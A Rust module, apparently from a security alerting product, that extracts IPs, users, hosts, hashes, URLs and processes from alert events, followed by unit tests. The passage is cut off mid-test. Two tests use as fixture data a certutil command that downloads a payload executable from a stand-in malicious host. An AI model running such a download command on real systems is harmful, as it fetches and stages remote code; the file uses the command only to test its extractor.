// SPDX-License-Identifier: AGPL-3.0-or-later

//! Entity Extraction from Alert Events
//!
//! Extracts security-relevant entities (IPs, users, hosts, domains, hashes, etc.)
//! from alert matched_events for case enrichment.

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

use crate::schema::{active_profile_from_env, EntityType, SchemaId, SchemaProfile};

/// An extracted entity from alert events
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub struct ExtractedEntity {
    pub entity_type: String,
    pub value: String,
}

/// NAN-3226: re-type `domain` entities under an internal suffix (built-in or
/// the tenant's) as `host`: internal names are hosts, never external domains.
/// Order is kept; a re-typed entity that duplicates an existing host is
/// dropped.
pub fn retype_internal_domains(
    entities: Vec<ExtractedEntity>,
    internal: &crate::internal_domains::InternalDomains,
) -> Vec<ExtractedEntity> {
    let mut seen = HashSet::new();
    let mut out = Vec::with_capacity(entities.len());
    for mut entity in entities {
        if entity.entity_type == "domain" && internal.is_internal(&entity.value) {
            entity.entity_type = "host".to_string();
        }
        if seen.insert(entity.clone()) {
            out.push(entity);
        }
    }
    out
}

/// Entity extractor for parsing entities from JSON events
pub struct EntityExtractor {
    ip_regex: Regex,
    domain_regex: Regex,
    email_regex: Regex,
    md5_regex: Regex,
    sha1_regex: Regex,
    sha256_regex: Regex,
    url_regex: Regex,
}

impl Default for EntityExtractor {
    fn default() -> Self {
        Self::new()
    }
}

impl EntityExtractor {
    pub fn new() -> Self {
        Self {
            // IPv4 pattern
            ip_regex: Regex::new(r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b").unwrap(),
            // Domain pattern (basic)
            domain_regex: Regex::new(r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b").unwrap(),
            // Email pattern
            email_regex: Regex::new(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b").unwrap(),
            // MD5 hash (32 hex chars)
            md5_regex: Regex::new(r"\b[a-fA-F0-9]{32}\b").unwrap(),
            // SHA1 hash (40 hex chars)
            sha1_regex: Regex::new(r"\b[a-fA-F0-9]{40}\b").unwrap(),
            // SHA256 hash (64 hex chars)
            sha256_regex: Regex::new(r"\b[a-fA-F0-9]{64}\b").unwrap(),
            // URL pattern (simplified)
            url_regex: Regex::new(r"https?://\S+").unwrap(),
        }
    }

    /// Extract all entities from matched events JSON
    pub fn extract_from_events(&self, events: &serde_json::Value) -> Vec<ExtractedEntity> {
        // NAN-1296: classify host/user/ip fields via the ACTIVE schema profile's
        // entity_type (not a hardcoded name list), so any promoted entity field —
        // OCSF device.hostname / src_endpoint.ip, UDM dvc / dvc_ip / user_name,
        // and any future field — is recognized automatically.
        //
        // NAN-2361: this used to fall back to UdmProfile on error. Against the
        // canonical OCSF lake that is not graceful degradation — UDM names match
        // nothing in a nested OCSF event, so every host/user/ip entity silently
        // vanished from case enrichment and grouping with no log anywhere. Fail
        // closed and loudly instead: no entities is visibly wrong, entities
        // classified against the wrong schema are plausibly wrong.
        let profile = match active_profile_from_env() {
            Ok(profile) => profile,
            Err(error) => {
                tracing::error!(
                    %error,
                    "entity extraction skipped: cannot resolve the active schema profile; \
                     refusing to classify event fields against a different schema"
                );
                return Vec::new();
            }
        };
        self.extract_from_events_with_profile(events, profile.as_ref())
    }

    /// [`Self::extract_from_events`] under an explicit schema profile.
    pub fn extract_from_events_with_profile(
        &self,
        events: &serde_json::Value,
        profile: &dyn SchemaProfile,
    ) -> Vec<ExtractedEntity> {
        let mut entities = HashSet::new();

        // Process the events array or single event
        match events {
            serde_json::Value::Array(arr) => {
                for event in arr {
                    self.extract_from_value(event, "", &mut entities, profile);
                }
            }
            serde_json::Value::Object(_) => {
                self.extract_from_value(events, "", &mut entities, profile);
            }
            _ => {}
        }

        entities.into_iter().collect()
    }

    /// Extract entities from a single JSON value (recursive)
    fn extract_from_value(
        &self,
        value: &serde_json::Value,
        path: &str,
        entities: &mut HashSet<ExtractedEntity>,
        profile: &dyn SchemaProfile,
    ) {
        match value {
            serde_json::Value::Object(map) => {
                for (key, val) in map {
                    let key = key.to_lowercase();
                    let full_path = if path.is_empty() {
                        key.clone()
                    } else {
                        format!("{path}.{key}")
                    };
                    // Canonical OCSF events are nested JSON. Preserve the full
                    // semantic path while descending so `device.hostname`,
                    // `actor.user.name`, and repeated `file.hashes.value`
                    // remain distinguishable from unrelated leaf names.
                    self.extract_by_field_name(&full_path, val, entities, profile);
                    // Legacy UDM rows are flat; calling with the leaf as well
                    // only matters for nested compatibility payloads and does
                    // not create a lake query/storage alias.
                    if !path.is_empty() {
                        self.extract_by_field_name(&key, val, entities, profile);
                    }
                    self.extract_from_value(val, &full_path, entities, profile);
                }
            }
            serde_json::Value::Array(arr) => {
                for item in arr {
                    self.extract_from_value(item, path, entities, profile);
                }
            }
            serde_json::Value::String(s) => {
                // Extract entities from string values using regex
                self.extract_from_string(s, entities);
            }
            _ => {}
        }
    }

    /// Extract entities based on known field names
    fn extract_by_field_name(
        &self,
        field_name: &str,
        value: &serde_json::Value,
        entities: &mut HashSet<ExtractedEntity>,
        profile: &dyn SchemaProfile,
    ) {
        let string_val = match value {
            serde_json::Value::String(s) => s.clone(),
            serde_json::Value::Number(n) => n.to_string(),
            _ => return,
        };

        if string_val.is_empty() || string_val == "-" || string_val == "null" {
            return;
        }

        // Host / User / IP — classified by the ACTIVE schema profile's entity_type
        // (NAN-1296) instead of a hardcoded name list, so every promoted entity
        // field is recognized (device.hostname, src_endpoint.ip, dvc, dvc_ip,
        // user_name, …). The value-shape checks (looks_like_*) still guard against
        // mis-typed values (e.g. a user.* field whose value is a SID, not a name).
        match profile.entity_type(field_name) {
            Some(EntityType::User)
                if !self.looks_like_ip(&string_val)
                    && !self.looks_like_hash(&string_val)
                    && self.looks_like_username(&string_val) =>
            {
                entities.insert(ExtractedEntity {
                    entity_type: "user".to_string(),
                    value: string_val.clone(),
                });
            }
            Some(EntityType::Host)
                if !self.looks_like_ip(&string_val) && self.looks_like_hostname(&string_val) =>
            {
                entities.insert(ExtractedEntity {
                    entity_type: "host".to_string(),
                    value: string_val.clone(),
                });
            }
            Some(EntityType::Ip) if self.looks_like_ip(&string_val) => {
                entities.insert(ExtractedEntity {
                    entity_type: "ip".to_string(),
                    value: string_val.clone(),
                });
            }
            _ => {}
        }

        // Domain fields — UDM columns that contain actual domain values
        if matches!(
            field_name,
            "url_domain"
                | "sender_domain"
                | "recipient_domain"
                | "http_request.url.hostname"
                | "url.hostname"
                | "query.hostname"
        ) {
            if !self.looks_like_ip(&string_val) && self.looks_like_domain(&string_val) {
                entities.insert(ExtractedEntity {
                    entity_type: "domain".to_string(),
                    value: string_val.to_lowercase(),
                });
            }
        }

        // Hash fields — UDM column names + OCSF promoted SHA-256 columns (NAN-1291).
        if matches!(
            field_name,
            "file_hash"
                | "process_hash"
                | "file.hashes.sha256"
                | "process.file.hashes.sha256"
                | "actor.process.file.hashes.sha256"
                | "file.hashes.value"
                | "process.file.hashes.value"
                | "actor.process.file.hashes.value"
        ) {
            if self.looks_like_hash(&string_val) {
                entities.insert(ExtractedEntity {
                    entity_type: "hash".to_string(),
                    value: string_val.to_lowercase(),
                });
            }
        }

        // URL fields — UDM column name + OCSF promoted URL strings (NAN-1291).
        if matches!(
            field_name,
            "url" | "url.url_string" | "http_request.url.url_string"
        ) {
            if string_val.starts_with("http://") || string_val.starts_with("https://") {
                entities.insert(ExtractedEntity {
                    entity_type: "url".to_string(),
                    value: string_val.clone(),
                });
            }
        }

        // Process fields — exact UDM column names only
        // process = full command line, process_name = exe name
        // parent_process / parent_process_name = parent exe name
        if matches!(
            field_name,
            "command_line"
                | "process_name"
                | "parent_command_line"
                | "parent_process_name"
                | "process.name"
                | "actor.process.name"
                | "process.cmd_line"
                | "actor.process.cmd_line"
        ) {
            if self.looks_like_process(&string_val) {
                entities.insert(ExtractedEntity {
                    entity_type: "process".to_string(),
                    value: string_val.clone(),
                });
            }
        }

        // File fields — UDM column names
        if matches!(
            field_name,
            "file_path"
                | "file_name"
                | "process_path"
                | "parent_process_path"
                | "file.path"
                | "file.name"
                | "process.file.path"
                | "actor.process.file.path"
        ) {
            if !string_val.is_empty() && string_val.len() > 1 {
                entities.insert(ExtractedEntity {
                    entity_type: "file".to_string(),
                    value: string_val.clone(),
                });
            }
        }

        // Email fields — UDM column names (sender/recipient contain email addresses)
        if matches!(field_name, "sender" | "recipient") {
            if string_val.contains('@') {
                entities.insert(ExtractedEntity {
                    entity_type: "email".to_string(),
                    value: string_val.to_lowercase(),
                });
            }
        }
    }

    /// Extract entities from a string using regex patterns
    fn extract_from_string(&self, s: &str, entities: &mut HashSet<ExtractedEntity>) {
        // Extract IPs
        for cap in self.ip_regex.find_iter(s) {
            let ip = cap.as_str().to_string();
            // Skip private/local IPs that are likely noise
            if !self.is_private_ip(&ip) {
                entities.insert(ExtractedEntity {
                    entity_type: "ip".to_string(),
                    value: ip,
                });
            }
        }

        // Extract URLs (before domains to avoid duplicates)
        for cap in self.url_regex.find_iter(s) {
            entities.insert(ExtractedEntity {
                entity_type: "url".to_string(),
                value: cap.as_str().to_string(),
            });
        }

        // Extract SHA256 hashes (most specific first)
        for cap in self.sha256_regex.find_iter(s) {
            entities.insert(ExtractedEntity {
                entity_type: "hash".to_string(),
                value: cap.as_str().to_lowercase(),
            });
        }

        // Extract SHA1 hashes (skip if already matched as SHA256)
        for cap in self.sha1_regex.find_iter(s) {
            let hash = cap.as_str().to_lowercase();
            if !entities.contains(&ExtractedEntity {
                entity_type: "hash".to_string(),
                value: hash.clone(),
            }) {
                entities.insert(ExtractedEntity {
                    entity_type: "hash".to_string(),
                    value: hash,
                });
            }
        }

        // Extract MD5 hashes (skip if already matched as longer hash)
        for cap in self.md5_regex.find_iter(s) {
            let hash = cap.as_str().to_lowercase();
            if !entities.contains(&ExtractedEntity {
                entity_type: "hash".to_string(),
                value: hash.clone(),
            }) {
                entities.insert(ExtractedEntity {
                    entity_type: "hash".to_string(),
                    value: hash,
                });
            }
        }

        // Extract emails
        for cap in self.email_regex.find_iter(s) {
            entities.insert(ExtractedEntity {
                entity_type: "email".to_string(),
                value: cap.as_str().to_lowercase(),
            });
        }
    }

    fn looks_like_ip(&self, s: &str) -> bool {
        self.ip_regex.is_match(s)
    }

    fn looks_like_domain(&self, s: &str) -> bool {
        self.domain_regex.is_match(s) && s.contains('.')
    }

    fn looks_like_hash(&self, s: &str) -> bool {
        let len = s.len();
        (len == 32 || len == 40 || len == 64) && s.chars().all(|c| c.is_ascii_hexdigit())
    }

    /// Check if a value looks like a valid hostname (not just a number or very short)
    fn looks_like_hostname(&self, s: &str) -> bool {
        // Must be at least 2 characters
        if s.len() < 2 {
            return false;
        }
        // Must not be just digits (likely an ID field)
        if s.chars().all(|c| c.is_ascii_digit()) {
            return false;
        }
        // Must not be common placeholder values
        let lower = s.to_lowercase();
        if lower == "localhost" || lower == "unknown" || lower == "none" || lower == "n/a" {
            return false;
        }
        true
    }

    /// Check if a value looks like a valid username (not just a number)
    fn looks_like_username(&self, s: &str) -> bool {
        // Must be at least 2 characters
        if s.len() < 2 {
            return false;
        }
        // Must not be just digits (likely an ID field)
        if s.chars().all(|c| c.is_ascii_digit()) {
            return false;
        }
        // Reject Windows SIDs (S-1-5-21-...)
        if s.starts_with("S-1-") {
            return false;
        }
        // Must not be common system/placeholder values
        let lower = s.to_lowercase();
        if matches!(
            lower.as_str(),
            "system"
                | "unknown"
                | "none"
                | "n/a"
                | "null"
                | "-"
                | "local service"
                | "network service"
                | "anonymous logon"
                | "window manager\\dwm-1"
                | "font driver host\\umfd-0"
        ) {
            return false;
        }
        // Reject machine accounts (trailing $) — these are computer accounts, not humans
        if s.ends_with('$') {
            return false;
        }
        true
    }

    /// Check if a value looks like a process name or command line
    fn looks_like_process(&self, s: &str) -> bool {
        // Reject pure numbers (PIDs)
        if s.chars().all(|c| c.is_ascii_digit()) {
            return false;
        }
        // Must contain at least one alpha character
        if !s.chars().any(|c| c.is_ascii_alphabetic()) {
            return false;
        }
        // Reject timestamps (ISO 8601-ish patterns: YYYY-MM-DD...)
        if s.len() > 10
            && s.as_bytes().iter().take(4).all(|b| b.is_ascii_digit())
            && s.as_bytes().get(4) == Some(&b'-')
        {
            return false;
        }
        // Reject hex-only strings that look like hashes/GUIDs
        if self.looks_like_hash(s) {
            return false;
        }
        let trimmed = s.trim();
        if trimmed.len() >= 32 && trimmed.chars().all(|c| c.is_ascii_hexdigit()) {
            return false;
        }
        // Reject common metadata values that leak from adjacent fields
        let lower = s.to_lowercase();
        if matches!(
            lower.as_str(),
            "high"
                | "low"
                | "medium"
                | "critical"
                | "informational"
                | "system"
                | "none"
                | "n/a"
                | "null"
                | "-"
                | "true"
                | "false"
        ) {
            return false;
        }
        // Reject Windows token/privilege metadata
        if lower.starts_with("token")
            || lower.starts_with("%%")
            || (lower.starts_with("se") && lower.ends_with("privilege"))
        {
            return false;
        }
        // Must be at least 2 characters
        if s.len() < 2 {
            return false;
        }
        true
    }

    fn is_private_ip(&self, ip: &str) -> bool {
        // Check for private IP ranges
        ip.starts_with("10.")
            || ip.starts_with("192.168.")
            || ip.starts_with("172.16.")
            || ip.starts_with("172.17.")
            || ip.starts_with("172.18.")
            || ip.starts_with("172.19.")
            || ip.starts_with("172.20.")
            || ip.starts_with("172.21.")
            || ip.starts_with("172.22.")
            || ip.starts_with("172.23.")
            || ip.starts_with("172.24.")
            || ip.starts_with("172.25.")
            || ip.starts_with("172.26.")
            || ip.starts_with("172.27.")
            || ip.starts_with("172.28.")
            || ip.starts_with("172.29.")
            || ip.starts_with("172.30.")
            || ip.starts_with("172.31.")
            || ip.starts_with("127.")
            || ip == "0.0.0.0"
    }

    /// Get the primary entity (most significant) from extracted entities
    pub fn get_primary_entity(&self, entities: &[ExtractedEntity]) -> Option<ExtractedEntity> {
        // Priority: host > user > ip > domain > hash
        let priority = |e: &ExtractedEntity| match e.entity_type.as_str() {
            "host" => 1,
            "user" => 2,
            "ip" => 3,
            "domain" => 4,
            "hash" => 5,
            _ => 10,
        };

        entities.iter().min_by_key(|e| priority(e)).cloned()
    }

    /// Extract the grouping key based on grouping type
    pub fn extract_grouping_key(
        &self,
        events: &serde_json::Value,
        grouping_type: &str,
    ) -> Option<String> {
        let entities = self.extract_from_events(events);

        match grouping_type {
            "host" => entities
                .iter()
                .find(|e| e.entity_type == "host")
                .map(|e| e.value.clone()),
            "user" => entities
                .iter()
                .find(|e| e.entity_type == "user")
                .map(|e| e.value.clone()),
            "ip" => entities
                .iter()
                .find(|e| e.entity_type == "ip")
                .map(|e| e.value.clone()),
            _ => None,
        }
    }

    /// Build a case title suffix from matched events using the active event
    /// contract. Canonical OCSF paths are read directly when that profile is
    /// active; legacy UDM fields remain isolated to the UDM profile.
    ///
    /// Priority order for context:
    /// 1. user@host (e.g., "admin@WS-001")
    /// 2. user@src_ip (e.g., "admin@192.168.1.50")
    /// 3. src_host → dest_host (e.g., "WS-001 → SERVER01")
    /// 4. src_ip → dest_ip (e.g., "192.168.1.50 → 10.0.0.5")
    /// 5. Just user (e.g., "admin")
    /// 6. Just host (e.g., "WS-001")
    /// 7. Just IP (e.g., "192.168.1.50")
    pub fn build_title_suffix(&self, events: &serde_json::Value) -> Option<String> {
        // NAN-2361: same fail-closed rule as `extract_from_events`. The OCSF
        // branch is selected by the profile id, so a UdmProfile substitution
        // silently read legacy flat names out of nested OCSF events and produced
        // an empty title suffix anyway — with no error to explain it.
        let schema = match active_profile_from_env() {
            Ok(profile) => profile.id(),
            Err(error) => {
                tracing::error!(
                    %error,
                    "case title context skipped: cannot resolve the active schema profile"
                );
                return None;
            }
        };
        self.build_title_suffix_for(events, schema)
    }

    /// [`Self::build_title_suffix`] for an explicit schema.
    pub fn build_title_suffix_for(&self, events: &serde_json::Value, schema: SchemaId) -> Option<String> {
        // Internal semantic slots used only to construct the title. They are
        // not exposed as lake query or storage aliases.
        let fields = self.extract_udm_fields(events, schema);

        let user = fields.get("user").or_else(|| fields.get("src_user"));
        let src_host = fields.get("src_host");
        let dest_host = fields.get("dest_host");
        let src_ip = fields.get("src_ip");
        let dest_ip = fields.get("dest_ip");

        // Build suffix based on what's available
        if let Some(u) = user {
            // User + location context
            if let Some(host) = src_host {
                return Some(format!("{}@{}", u, host));
            }
            if let Some(ip) = src_ip {
                return Some(format!("{}@{}", u, ip));
            }
            // Just user
            return Some(u.clone());
        }

        // Host flow (src → dest)
        if let (Some(src), Some(dest)) = (src_host, dest_host) {
            if src != dest {
                return Some(format!("{} → {}", src, dest));
            }
            return Some(src.clone());
        }

        // IP flow (src → dest)
        if let (Some(src), Some(dest)) = (src_ip, dest_ip) {
            if src != dest {
                return Some(format!("{} → {}", src, dest));
            }
            return Some(src.clone());
        }

        // Single host or IP
        if let Some(host) = src_host.or(dest_host) {
            return Some(host.clone());
        }
        if let Some(ip) = src_ip.or(dest_ip) {
            return Some(ip.clone());
        }

        None
    }

    /// Extract common UDM fields from matched events
    fn extract_udm_fields(
        &self,
        events: &serde_json::Value,
        schema: SchemaId,
    ) -> std::collections::HashMap<String, String> {
        let mut fields = std::collections::HashMap::new();

        // UDM field names - data is already normalized to these exact names
        let udm_fields = [
            "user",
            "src_user",
            "dest_user",
            "src_host",
            "dest_host",
            "src_ip",
            "dest_ip",
        ];

        // Process array or single event
        let events_to_check: Vec<&serde_json::Value> = match events {
            serde_json::Value::Array(arr) => arr.iter().collect(),
            serde_json::Value::Object(_) => vec![events],
            _ => vec![],
        };

        // Extract from first event that has each field
        for event in events_to_check {
            if let serde_json::Value::Object(map) = event {
                if schema == SchemaId::Ocsf {
                    // Aggregated detection rows (`stats … by device.hostname`)
                    // carry the group-by field as a literal dotted key; raw
                    // events carry it nested. Read both, literal first — the
                    // same rule `case_grouping::event_field_string` uses
                    // (NAN-3036).
                    let nested = |path: &str| {
                        map.get(path)
                            .or_else(|| {
                                path.split('.')
                                    .try_fold(event, |value, part| value.get(part))
                            })
                            .and_then(|value| self.value_to_string(value))
                            .filter(|value| {
                                !value.is_empty()
                                    && value != "-"
                                    && !value.eq_ignore_ascii_case("null")
                            })
                    };
                    for (slot, paths) in [
                        ("user", &["actor.user.name", "user.name"][..]),
                        (
                            "src_host",
                            &["src_endpoint.hostname", "device.hostname"][..],
                        ),
                        ("dest_host", &["dst_endpoint.hostname"][..]),
                        ("src_ip", &["src_endpoint.ip"][..]),
                        ("dest_ip", &["dst_endpoint.ip"][..]),
                    ] {
                        if fields.contains_key(slot) {
                            continue;
                        }
                        if let Some(value) = paths.iter().find_map(|path| nested(path)) {
                            fields.insert(slot.to_string(), value);
                        }
                    }
                    continue;
                }
                for field in &udm_fields {
                    if fields.contains_key(*field) {
                        continue;
                    }
                    if let Some(val) = map.get(*field) {
                        if let Some(s) = self.value_to_string(val) {
                            if !s.is_empty() && s != "-" && s.to_lowercase() != "null" {
                                fields.insert((*field).to_string(), s);
                            }
                        }
                    }
                }
            }
        }

        fields
    }

    /// Convert JSON value to string if appropriate
    fn value_to_string(&self, val: &serde_json::Value) -> Option<String> {
        match val {
            serde_json::Value::String(s) => Some(s.clone()),
            serde_json::Value::Number(n) => Some(n.to_string()),
            _ => None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn internal_domains_are_hosts_not_domains() {
        use crate::internal_domains::InternalDomains;
        let entity = |t: &str, v: &str| ExtractedEntity { entity_type: t.into(), value: v.into() };
        let entities = vec![
            entity("domain", "db1.prod"),
            entity("domain", "login.example.com"),
            entity("host", "db1.prod"),
            entity("domain", "fs.corp.local"),
            entity("domain", "myprod.com"),
        ];
        let out = retype_internal_domains(entities.clone(), &InternalDomains::with_tenant(["prod"]));
        assert_eq!(
            out,
            vec![
                entity("host", "db1.prod"),
                entity("domain", "login.example.com"),
                entity("host", "fs.corp.local"),
                entity("domain", "myprod.com"),
            ]
        );
        // Another tenant's list leaves db1.prod a domain.
        let other = retype_internal_domains(entities, &InternalDomains::with_tenant(["cloud"]));
        assert!(other.contains(&entity("domain", "db1.prod")));
    }

    #[test]
    fn extracts_entities_from_nested_ocsf_19_paths() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "device": {"hostname": "lt-legal-001.corp.local"},
            "src_endpoint": {"ip": "198.51.100.25"},
            "actor": {"user": {"name": "bsmith"}},
            "process": {
                "name": "powershell.exe",
                "file": {"hashes": [{"algorithm_id": 3, "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}
            }
        });
        let mut entities = HashSet::new();
        extractor.extract_from_value(
            &events,
            "",
            &mut entities,
            &crate::schema::OcsfProfile::new(),
        );
        for (entity_type, value) in [
            ("host", "lt-legal-001.corp.local"),
            ("ip", "198.51.100.25"),
            ("user", "bsmith"),
            ("process", "powershell.exe"),
            (
                "hash",
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ),
        ] {
            assert!(
                entities.contains(&ExtractedEntity {
                    entity_type: entity_type.to_string(),
                    value: value.to_string(),
                }),
                "missing {entity_type}={value}"
            );
        }
    }

    /// NAN-3036: aggregated lean rows carry `device.hostname` as a literal
    /// dotted key; the OCSF title context must read it like nested paths.
    #[test]
    fn ocsf_title_suffix_reads_literal_dotted_keys() {
        let extractor = EntityExtractor::new();
        let aggregated = serde_json::json!([{
            "_nano_source_types": ["windows_sysmon"],
            "device.hostname": "e2e-b98b021b-ps.corp.local",
            "hits": 1,
        }]);
        assert_eq!(
            extractor.build_title_suffix_for(&aggregated, SchemaId::Ocsf).as_deref(),
            Some("e2e-b98b021b-ps.corp.local")
        );
        let nested = serde_json::json!({
            "device": {"hostname": "ws-1"},
            "actor": {"user": {"name": "bob"}},
        });
        assert_eq!(extractor.build_title_suffix_for(&nested, SchemaId::Ocsf).as_deref(), Some("bob@ws-1"));
    }

    #[test]
    fn test_extract_ip() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "src_ip": "203.0.113.1",
            "dest_ip": "8.8.8.8"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "ip" && e.value == "203.0.113.1"));
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "ip" && e.value == "8.8.8.8"));
    }

    #[test]
    fn test_extract_user() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "user": "john.doe",
            "src_user": "admin"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value == "john.doe"));
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value == "admin"));
    }

    #[test]
    fn test_extract_hash() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "file_hash": "d41d8cd98f00b204e9800998ecf8427e"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());
        assert!(entities.iter().any(|e| e.entity_type == "hash"));
    }

    #[test]
    fn test_skip_private_ips() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "message": "Connection from 192.168.1.1 to 8.8.4.4"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());
        // Should extract 8.8.4.4 but not 192.168.1.1
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "ip" && e.value == "8.8.4.4"));
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "ip" && e.value == "192.168.1.1"));
    }

    #[test]
    fn test_skip_numeric_hosts() {
        let extractor = EntityExtractor::new();
        // Only src_host/dest_host are UDM host fields
        let events = serde_json::json!({
            "src_host": "1",
            "dest_host": "WS-001"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());
        // Should NOT extract numeric-only values as hosts
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "host" && e.value == "1"));
        // Should extract valid hostname
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "host" && e.value == "WS-001"));
    }

    #[test]
    fn test_skip_numeric_users() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "user": "admin",
            "src_user": "john.doe"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value == "admin"));
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value == "john.doe"));
    }

    #[test]
    fn test_skip_placeholder_values() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "src_host": "unknown",
            "user": "system",
            "dest_host": "none"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());
        // Should NOT extract placeholder values
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "host" && e.value.to_lowercase() == "unknown"));
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value.to_lowercase() == "system"));
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "host" && e.value.to_lowercase() == "none"));
    }

    #[test]
    fn test_reject_non_user_fields() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "user": "jsmith",
            "user_domain": "CORP",
            "user_id": "S-1-5-21-3342417413-3922",
            "user_type": "User",
            "http_user_agent": "Mozilla/5.0",
            "user_name": "jsmith@corp.local"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());
        // Should extract actual usernames
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value == "jsmith"));
        assert!(entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value == "jsmith@corp.local"));
        // Should NOT extract domain, SID, type, or user agent as users
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value == "CORP"));
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value.starts_with("S-1-")));
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value == "User"));
        assert!(!entities
            .iter()
            .any(|e| e.entity_type == "user" && e.value.contains("Mozilla")));
    }

    #[test]
    fn test_reject_sids_and_machine_accounts() {
        let extractor = EntityExtractor::new();
        assert!(!extractor.looks_like_username("S-1-5-21-3342417413-3922"));
        assert!(!extractor.looks_like_username("S-1-5-21-7147780108-3462"));
        assert!(!extractor.looks_like_username("WORKSTATION$"));
        assert!(!extractor.looks_like_username("DC01$"));
        assert!(!extractor.looks_like_username("anonymous logon"));

        assert!(extractor.looks_like_username("jsmith"));
        assert!(extractor.looks_like_username("jsmith@corp.local"));
        assert!(extractor.looks_like_username("CORP\\jsmith"));
    }

    #[test]
    fn test_process_field_specificity() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://malware.com/payload.exe",
            "process_id": "13355",
            "process_path": "C:\\Windows\\System32\\certutil.exe",
            "process_hash": "B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5",
            "process_guid": "abc123",
            "parent_process_name": "explorer.exe",
            "parent_process_id": "9999",
            "parent_process_path": "C:\\Windows\\explorer.exe"
        });
        let entities = extractor.extract_from_events_with_profile(&events, &crate::schema::UdmProfile::new());

        // Should extract actual process names from UDM fields
        assert!(
            entities
                .iter()
                .any(|e| e.entity_type == "process" && e.value == "certutil.exe"),
            "Should extract process_name"
        );
        assert!(
            entities
                .iter()
                .any(|e| e.entity_type == "process" && e.value == "explorer.exe"),
            "Should extract parent_process_name"
        );
        assert!(
            entities
                .iter()
                .any(|e| e.entity_type == "process" && e.value.contains("certutil.exe -urlcache")),
            "Should extract process (command line)"
        );

        // Should extract paths as file entities
        assert!(
            entities
                .iter()
                .any(|e| e.entity_type == "file" && e.value.contains("certutil.exe")),
            "Should extract process_path as file"
        );
        assert!(
            entities
                .iter()
                .any(|e| e.entity_type == "file" && e.value.contains("explorer.exe")),
            "Should extract parent_process_path as file"
        );

        // Should NOT extract junk from non-name process_* fields
        assert!(
            !entities
                .iter()
                .any(|e| e.entity_type == "process" && e.value == "13355"),
            "Should not extract process_id as process"
        );
        assert!(
            !entities
                .iter()
                .any(|e| e.entity_type == "process" && e.value == "9999"),
            "Should not extract parent_process_id as process"
        );
        assert!(
            !entities
                .iter()
                .any(|e| e.entity_type == "process" && e.value == "abc123"),
            "Should not extract process_guid as process"
        );
    }

    #[test]
    fn test_process_rejects_metadata_values() {
        let extractor = EntityExtractor::new();
        assert!(!extractor.looks_like_process("13355")); // PID
        assert!(!extractor.looks_like_process("2026-02-12 22:54:25.007080000")); // Timestamp
        assert!(!extractor.looks_like_process("High")); // Integrity/severity
        assert!(!extractor.looks_like_process("System")); // System account
        assert!(!extractor.looks_like_process("TokenElevationTypeFull")); // Token metadata
        assert!(!extractor.looks_like_process("B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5")); // Hash
        assert!(!extractor.looks_like_process("%%1936")); // Windows privilege ID

        assert!(extractor.looks_like_process("cmd.exe"));
        assert!(extractor.looks_like_process("powershell.exe"));
        assert!(extractor.looks_like_process("certutil.exe -urlcache -split -f http://x.com/p.exe"));
        assert!(extractor.looks_like_process("csrss.exe"));
    }

    #[test]
    fn test_title_suffix_user_and_host() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "user": "admin",
            "src_host": "WS-001"
        });
        let suffix = extractor.build_title_suffix_for(&events, SchemaId::Udm);
        assert_eq!(suffix, Some("admin@WS-001".to_string()));
    }

    #[test]
